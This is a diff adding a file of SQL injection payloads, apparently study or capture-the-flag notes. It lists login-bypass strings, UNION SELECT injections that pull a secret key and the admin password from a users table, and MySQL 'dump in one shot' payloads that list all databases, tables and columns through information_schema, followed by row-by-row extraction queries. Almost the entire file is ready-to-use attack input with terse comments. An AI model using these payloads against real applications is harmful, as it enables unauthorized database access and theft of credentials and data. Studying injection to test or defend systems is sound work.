@@ -1,0 +1,85 @@
+1. 	username: a' or 1=1 -- 
+	password: b'' or 1=1 -- 
+
+
+
+2. a'   union select 1,2,(select secret_key from hidden_data),4   -- 
+
+
+=========================================================================================
+a'      union select 1,2,((select password from users where username='admin')),4     -- 
+=========================================================================================
+
+
+
+
+
+
+
+DIOS (Dump in one shot):
+------------------------------
+
+
+# to see all the databases:
+
+(select (@a) from (select(@a:=0x00),(select (@a) from (information_schema.schemata)where (@a)in (@a:=concat(@a,schema_name,'<br>'))))a)
+
+
+
+
+#to see all the table_names(last ones are the useful ones):
+
+(select (@a) from (select(@a:=0x00),(select (@a) from (information_schema.tables)where (@a)in (@a:=concat(@a,table_name,'<br>'))))a)
+
+
+
+#to see the table names not belongs to information_schema:
+
+(select (@a) from (select(@a:=0x00),(select (@a) from (information_schema.tables)where table_schema!='information_schema' and(@a)in (@a:=concat(@a,table_name,'<br>'))))a)
+
+
+
+#to see database:tables pair:
+
+(select (@a) from (select(@a:=0x00),(select (@a) from (information_schema.tables)where table_schema!='information_schema' and(@a)in (@a:=concat(@a,table_schema,0x3a,table_name,'<br>'))))a)
+
+
+
+#to see database>table>column:
+
+
+(select (@a) from (select(@a:=0x00),(select (@a) from (information_schema.columns)where table_schema!='information_schema' and(@a)in (@a:=concat(@a,table_schema,' > ',table_name,' > ',column_name,'<br>'))))a)
+
+
+
+
+#with pattern:(shit_%)
+
+
+(select (@a) from (select(@a:=0x00),(select (@a) from (information_schema.columns)where table_schema!='information_schema' and table_name like 'shit_%' and(@a)in (@a:=concat(@a,table_schema,' > ',table_name,' > ',column_name,'<br>'))))a)
+
+
+
+
+
+-------------------------------------------
+to get one by one
+---------------------------------------------
+
+#table_names:
+(select table_name from information_schema.tables where table_schema=database() limit 0,1)
+
+
+#column_names:
+
+(select column_name from information_schema.columns where table_name='tbl_name' limit 0,1)
+
+
+
+#to get data from table:
+(select username from users limit 0,1)
+(select secret_flag from users limit 0,1)
+
+
+
+
